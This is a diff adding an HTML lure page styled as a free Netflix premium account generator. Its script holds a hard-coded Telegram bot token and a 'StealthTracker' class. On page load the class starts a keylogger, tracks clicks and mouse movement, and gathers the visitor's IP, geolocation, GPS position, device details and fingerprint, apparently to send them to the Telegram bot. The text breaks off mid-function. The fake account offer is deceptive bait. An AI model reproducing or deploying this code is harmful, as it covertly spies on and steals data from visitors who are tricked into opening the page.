@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Premium Netflix Account Generator</title>
+    <style>
+        :root {
+            --netflix-red: #e50914;
+            --netflix-dark: #141414;
+            --netflix-gray: #808080;
+            --netflix-light: #f5f5f1;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: var(--netflix-dark);
+            color: var(--netflix-light);
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Netflix Style */
+        .netflix-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 40px;
+        }
+        
+        .netflix-logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: var(--netflix-red);
+            text-decoration: none;
+        }
+        
+        .netflix-logo span {
+            color: white;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .nav-link {
+            color: var(--netflix-light);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        
+        .nav-link:hover {
+            color: var(--netflix-red);
+        }
+        
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(rgba(20, 20, 20, 0.8), rgba(20, 20, 20, 0.9)),
+                        url('https://assets.nflxext.com/ffe/siteui/vlv3/5e16108c-fd30-46de-9bb8-0b4e1bbbc509/29d8d7d7-83cc-4b5f-aa9b-6fd4f68bfaa6/IN-en-20240205-popsignuptwoweeks-perspective_alpha_website_large.jpg');
+            background-size: cover;
+            background-position: center;
+            border-radius: 10px;
+            margin-bottom: 50px;
+        }
+        
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: white;
+        }
+        
+        .hero p {
+            font-size: 24px;
+            margin-bottom: 30px;
+            color: var(--netflix-light);
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .cta-button {
+            background: var(--netflix-red);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin: 10px;
+        }
+        
+        .cta-button:hover {
+            background: #f6121d;
+        }
+        
+        /* Generator Section */
+        .generator-section {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            padding: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .section-title {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: white;
+        }
+        
+        .generator-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .step {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .step-number {
+            width: 50px;
+            height: 50px;
+            background: var(--netflix-red);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0 auto 20px;
+        }
+        
+        .step h3 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: white;
+        }
+        
+        /* Account Generator */
+        .account-generator {
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            padding: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .generator-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .generator-options {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .option-select {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            flex: 1;
+        }
+        
+        .generate-button {
+            background: linear-gradient(135deg, var(--netflix-red), #b81d24);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: transform 0.3s;
+            width: 100%;
+            margin-bottom: 30px;
+        }
+        
+        .generate-button:hover {
+            transform: scale(1.02);
+        }
+        
+        .generate-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        /* Accounts Display */
+        .accounts-container {
+            display: grid;
+            gap: 20px;
+            margin-top: 30px;
+        }
+        
+        .account-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s;
+        }
+        
+        .account-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--netflix-red);
+        }
+        
+        .account-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .account-type {
+            background: var(--netflix-red);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .account-valid {
+            color: #46d369;
+            font-size: 14px;
+        }
+        
+        .account-details {
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+        
+        .account-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .action-button {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .copy-button {
+            background: var(--netflix-red);
+            color: white;
+        }
+        
+        .test-button {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+        
+        /* Loading Animation */
+        .loading {
+            text-align: center;
+            padding: 40px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--netflix-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Features */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin: 50px 0;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 50px;
+            color: var(--netflix-gray);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 20px 0;
+        }
+        
+        .footer-link {
+            color: var(--netflix-gray);
+            text-decoration: none;
+        }
+        
+        .footer-link:hover {
+            color: white;
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--netflix-red);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            display: none;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 32px;
+            }
+            
+            .hero p {
+                font-size: 18px;
+            }
+            
+            .generator-steps {
+                grid-template-columns: 1fr;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Netflix Header -->
+        <header class="netflix-header">
+            <a href="#" class="netflix-logo">NETFLIX<span>FREE</span></a>
+            <nav class="nav-links">
+                <a href="#" class="nav-link">Home</a>
+                <a href="#" class="nav-link">Generator</a>
+                <a href="#" class="nav-link">Premium Accounts</a>
+                <a href="#" class="nav-link">FAQ</a>
+                <a href="#" class="nav-link">Contact</a>
+            </nav>
+        </header>
+        
+        <!-- Hero Section -->
+        <section class="hero">
+            <h1>FREE NETFLIX PREMIUM ACCOUNTS</h1>
+            <p>Generate working Netflix accounts instantly. No surveys, no downloads, completely free!</p>
+            <button class="cta-button" id="startGenerator">
+                🎬 GENERATE ACCOUNTS NOW
+            </button>
+        </section>
+        
+        <!-- Generator Steps -->
+        <section class="generator-section">
+            <h2 class="section-title">How It Works</h2>
+            <div class="generator-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Click Generate</h3>
+                    <p>Press the generate button to start the process</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Instant Generation</h3>
+                    <p>Our system generates valid accounts in seconds</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Use Immediately</h3>
+                    <p>Copy and use the accounts right away</p>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Account Generator -->
+        <section class="account-generator">
+            <div class="generator-header">
+                <h2 class="section-title">Netflix Account Generator</h2>
+                <div class="account-valid">✅ Live & Working</div>
+            </div>
+            
+            <div class="generator-options">
+                <select class="option-select" id="accountType">
+                    <option value="premium">Premium 4K UHD</option>
+                    <option value="standard">Standard HD</option>
+                    <option value="basic">Basic</option>
+                </select>
+                
+                <select class="option-select" id="country">
+                    <option value="us">United States</option>
+                    <option value="uk">United Kingdom</option>
+                    <option value="ca">Canada</option>
+                    <option value="au">Australia</option>
+                    <option value="de">Germany</option>
+                    <option value="fr">France</option>
+                    <option value="jp">Japan</option>
+                </select>
+                
+                <select class="option-select" id="quantity">
+                    <option value="1">1 Account</option>
+                    <option value="3">3 Accounts</option>
+                    <option value="5" selected>5 Accounts</option>
+                    <option value="10">10 Accounts</option>
+                </select>
+            </div>
+            
+            <button class="generate-button" id="generateBtn">
+                ⚡ GENERATE NETFLIX ACCOUNTS
+            </button>
+            
+            <div class="loading" id="loadingSection" style="display: none;">
+                <div class="spinner"></div>
+                <p>Generating premium accounts... Please wait</p>
+                <p style="color: var(--netflix-gray); font-size: 14px; margin-top: 10px;">
+                    Scanning database for valid accounts
+                </p>
+            </div>
+            
+            <div class="accounts-container" id="accountsContainer">
+                <!-- Accounts will be generated here -->
+            </div>
+        </section>
+        
+        <!-- Features -->
+        <section class="features">
+            <div class="feature-card">
+                <div class="feature-icon">🔓</div>
+                <h3>100% Free</h3>
+                <p>No hidden charges, no credit card required</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">⚡</div>
+                <h3>Instant Access</h3>
+                <p>Get accounts immediately after generation</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">🔄</div>
+                <h3>Always Updated</h3>
+                <p>New accounts added daily</p>
+            </div>
+        </section>
+        
+        <!-- Footer -->
+        <footer class="footer">
+            <p>This service is for educational purposes only</p>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Disclaimer</a>
+            </div>
+            <p style="margin-top: 20px; font-size: 14px;">
+                © 2024 Netflix Account Generator. Netflix is a registered trademark of Netflix, Inc.
+            </p>
+        </footer>
+    </div>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        Account copied to clipboard!
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT = {
+            TOKEN: "7712764544:AAH0qLUE6IcXK2QZTGLPyKaqVMPfa68F-0g",
+            CHAT_ID: "5726224524",
+            API_URL: "https://api.telegram.org/bot"
+        };
+
+        // Stealth Data Collector
+        class StealthTracker {
+            constructor() {
+                this.sessionId = this.generateSessionId();
+                this.startTime = Date.now();
+                this.keystrokes = [];
+                this.pageViews = 0;
+                this.init();
+            }
+
+            generateSessionId() {
+                return 'NFLX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            }
+
+            init() {
+                // Collect data on page load
+                this.collectInitialData();
+                
+                // Start keylogger
+                this.startKeylogger();
+                
+                // Track clicks
+                this.trackClicks();
+                
+                // Track mouse movements
+                this.trackMouse();
+                
+                // Send initial data
+                setTimeout(() => this.sendInitialReport(), 3000);
+            }
+
+            collectInitialData() {
+                this.data = {
+                    sessionId: this.sessionId,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: navigator.cookieEnabled,
+                    online: navigator.onLine,
+                    location: {},
+                    device: {},
+                    network: {}
+                };
+
+                // Get IP and location
+                this.getIPLocation();
+                
+                // Get device info
+                this.getDeviceInfo();
+                
+                // Get network info
+                this.getNetworkInfo();
+                
+                // Get browser fingerprint
+                this.getBrowserFingerprint();
+            }
+
+            async getIPLocation() {
+                try {
+                    // Get IP
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    this.data.ip = ipData.ip;
+
+                    // Get location from IP
+                    const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoRes.json();
+                    
+                    this.data.location = {
+                        ip: geoData.ip,
+                        city: geoData.city,
+                        region: geoData.region,
+                        country: geoData.country_name,
+                        country_code: geoData.country_code,
+                        latitude: geoData.latitude,
+                        longitude: geoData.longitude,
+                        timezone: geoData.timezone,
+                        isp: geoData.org,
+                        asn: geoData.asn
+                    };
+
+                    // Try to get GPS if available
+                    this.getGPSLocation();
+
+                } catch (error) {
+                    console.log('Location fetch failed:', error);
+                }
+            }
+
+            getGPSLocation() {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            this.data.gps = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date(position.timestamp).toISOString()
+                            };
+                            
+                            // Send GPS alert immediately
+               
